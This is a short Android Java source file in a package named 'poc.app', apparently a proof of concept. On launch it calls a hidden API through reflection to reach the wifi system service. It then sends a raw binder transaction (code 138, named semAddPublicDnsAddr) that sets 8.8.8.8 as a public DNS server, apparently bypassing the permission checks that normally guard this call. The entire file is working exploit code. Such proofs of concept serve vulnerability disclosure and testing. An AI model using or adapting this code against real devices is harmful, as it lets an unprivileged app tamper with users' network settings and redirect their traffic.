package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;

public class MainActivity extends Activity {
    static final int TRANSACTION_semAddPublicDnsAddr = 138;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("wifi");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
            parcel.writeString("8.8.8.8");

            Parcel reply = Parcel.obtain();
            binder.transact(TRANSACTION_semAddPublicDnsAddr, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}